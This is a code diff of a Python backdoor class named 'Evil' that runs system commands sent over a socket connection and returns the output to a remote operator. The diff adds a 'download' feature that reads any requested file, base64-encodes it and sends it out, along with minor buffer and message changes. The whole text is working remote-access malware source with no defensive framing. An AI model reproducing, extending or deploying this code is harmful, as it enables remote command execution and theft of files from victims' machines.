@@ -8,6 +8,7 @@ import socket
 import subprocess
 import json
 import os
+import base64
 
 class Evil:
     def __init__(self,ip,port):
@@ -23,7 +24,7 @@ class Evil:
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(2048)
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -35,6 +36,10 @@ class Evil:
         os.chdir(path)
         return "Changing dir to " + path
 
+    def read_file(self,path):
+        with open(path,"rb") as target_file:
+            return base64.b64encode(target_file.read())
+
     def run(self):
         while True:
             try:
@@ -45,14 +50,16 @@ class Evil:
                     exit()
                 elif cmd[0] == "cd" and len(cmd) > 1:
                     cmd_result = self.change_working_dir(cmd[1])
+                elif cmd[0] == "download" and len(cmd) > 1:
+                    cmd_result = self.read_file(cmd[1])
                 else:
                     cmd_result = self.exec_sys_cmd(cmd)
                 if not cmd_result:
-                    self.reliable_send("System command exception")
+                    self.reliable_send("[-] Command exception.")
                     continue
                 self.reliable_send(cmd_result)
             except Exception:
-                self.reliable_send("Something wrong...")
+                self.reliable_send("[-] Something wrong.")
                 continue
 
         self.connection.close()
